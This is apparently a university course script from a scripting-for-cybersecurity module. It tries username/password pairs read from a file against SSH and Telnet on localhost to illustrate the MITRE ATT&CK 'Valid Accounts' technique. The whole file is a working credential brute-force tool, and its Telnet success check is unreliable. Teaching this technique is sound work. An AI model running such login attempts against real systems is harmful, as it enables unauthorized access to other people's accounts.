"""
==========================================================
Course:    COMPSFI 212 – Scripting for Cybersecurity
Module:    Chapter 2 – Initial Access (Valid Accounts)
Script:    TestDefaultCredentials.py
Purpose:   Demonstrates brute-force style login attempts
           against SSH and Telnet services using Python.
Author:    Dr. Md Ali
Date:      2025-08-25
Version:   1.0

Description:
    - Attempts to authenticate via SSH (paramiko).
    - Attempts to authenticate via Telnet (telnetlib).
    - Reads credentials from defaults.txt file.
    - Illustrates MITRE ATT&CK "Valid Accounts" technique.

Dependencies:
    - Python 3.x
    - paramiko (pip install paramiko)

Usage:
    python TestDefaultCredentials.py
    # Make sure defaults.txt contains username password pairs
==========================================================
"""

import paramiko
import telnetlib
import socket

def SSHLogin(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print("SSH login successful on %s:%s with username %s and password %s" %
                  (host, port, username, password))
        ssh.close()
    except Exception:
        print("SSH login failed %s %s" % (username, password))


def TelnetLogin(host, port, username, password):
    try:
        tn = telnetlib.Telnet(host, port, timeout=1)
        tn.read_until(b"login: ")
        tn.write((username + "\n").encode("utf-8"))
        tn.read_until(b"Password: ")
        tn.write((password + "\n").encode("utf-8"))
        result = tn.expect([b"Last login"])
        if result[0] >= 0:
            print("Telnet login successful on %s:%s with username %s and password %s" %
                  (host, port, username, password))
        tn.close()
    except (EOFError, socket.timeout):
        print("Telnet login failed %s %s" % (username, password))


# Target host and ports
host = "127.0.0.1"
sshport = 22
telnetport = 23

# Read usernames and passwords from defaults.txt
with open("defaults.txt", "r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host, sshport, username, password)
        TelnetLogin(host, telnetport, username, password)

